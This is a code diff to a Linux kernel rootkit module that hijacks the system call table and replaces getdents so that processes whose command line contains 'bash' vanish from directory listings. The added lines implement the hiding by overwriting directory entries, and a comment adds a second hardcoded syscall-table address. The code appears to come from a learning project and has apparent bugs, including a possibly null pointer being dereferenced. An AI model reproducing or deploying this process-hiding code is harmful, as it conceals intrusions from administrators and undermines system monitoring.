@@ -226,9 +226,10 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 	
 
 	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
+		pdirp = NULL;
 		cdirp = (struct linux_dirent*)(start_offset + i);
 		
-		if (isnumber(cdirp->d_name)){
+		if (isnumber(cdirp->d_name)){ //dirent is a process
 			for (k = 0; k<128; k++){
 				kbuf[k] = 0;
 				kbuf2[k] = 0;
@@ -267,9 +268,18 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 				set_fs(fs);
 				//check process for "test"
 				printk(KERN_INFO "kbuf: %s\n",kbuf);
-				if(strstr(kbuf, "indicator")!=NULL){
+				if(strstr(kbuf, "bash")!=NULL){
 					printk("File to hide %s\n", kbuf2);
-					pdirp->d_reclen += cdirp->d_reclen;
+					if(i<num_reads) {
+						/*if cmdline contains detected string*/
+						pdirp = cdirp;
+						//copy contents of the rest of the dir entries, writing over the entry we want to hide
+						memmove(pdirp, (char*)cdirp + cdirp->d_reclen, (num_reads-i));
+					}
+					else cdirp->d_off = 1024;
+					//adjust numread total returned by getdents and set cdirp to the new adjusted entry
+					num_reads -= pdirp->d_reclen;
+					cdirp=pdirp;
 				}
 
 			}
@@ -277,7 +287,7 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 
 		}
 		/*set previous dirp to current dirp (to be used next iteration of loop)*/
-		pdirp = cdirp;
+		//pdirp = cdirp;
 
 		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",
 		       cdirp->d_ino, cdirp->d_reclen, cdirp->d_off, cdirp->d_name);
@@ -334,6 +344,10 @@ int init_module(void){
 	 * taken from the /boot/System map file. This address seems to be same
 	 * after every boot, so for now it can be hardcoded.
 	 */
+
+	/*Edwin's syscall table address: 
+	sys_call_table = (unsigned long*)0xc1688140; */
+	
 	sys_call_table = (unsigned long*)0xc15c3060;
 	hijack_sys_call_table();	
 	
